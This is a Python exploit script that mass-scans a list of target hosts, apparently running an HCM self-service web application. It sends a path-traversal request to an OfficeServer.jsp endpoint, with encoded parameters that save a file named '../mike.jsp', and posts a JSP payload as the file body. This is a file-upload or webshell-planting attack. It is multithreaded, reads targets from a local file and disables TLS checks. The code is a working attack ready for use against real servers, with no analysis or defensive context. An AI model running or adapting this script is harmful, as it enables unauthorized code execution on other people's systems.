import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'


def exploit(ip_, index):
    try:

        url = ip_+r'/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp'
        # print(index,url)
        params = {
            'DBSTEP': 'REJTVEVQ',
            'OPTION': 'U0FWRUZJTEU=',
            'currentUserId': 'zUCTwigsziCAPLesw4gsw4oEwV66',
            'FILETYPE': 'Li4vbWlrZS5qc3A=',
            'RECOR1DID': 'qLSGw4SXzLeGw4V3wUw3zUoXwid6',
            'originalFileId': 'wV66',
            'originalCreateDate': 'wUghPB3szB3Xwg66',
            'FILENAME': 'qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6',
            'needReadFile': 'yRWZdAS6',
            'originalCreateDate': 'wLSGP4oEzLKAz4=iz=66'
        }
        data = r'<%out.println("mike");%>'
        res = requests.post(url,data=data, headers=headers, timeout=8, verify=False)
        if res.status_code!=200:
            return
        print(res, len(res.text))
        print(index,ip_)
        print(res.text)
        # with result_path.open('a+') as file:
            # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass

# url=''
# exploit(url,1)


threads = []
with open(r'D:\Downloads\tmp\HCM.txt', 'r') as file:
    # with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 40
        end = start+60

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 20
# print(urls)

test = 'm'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()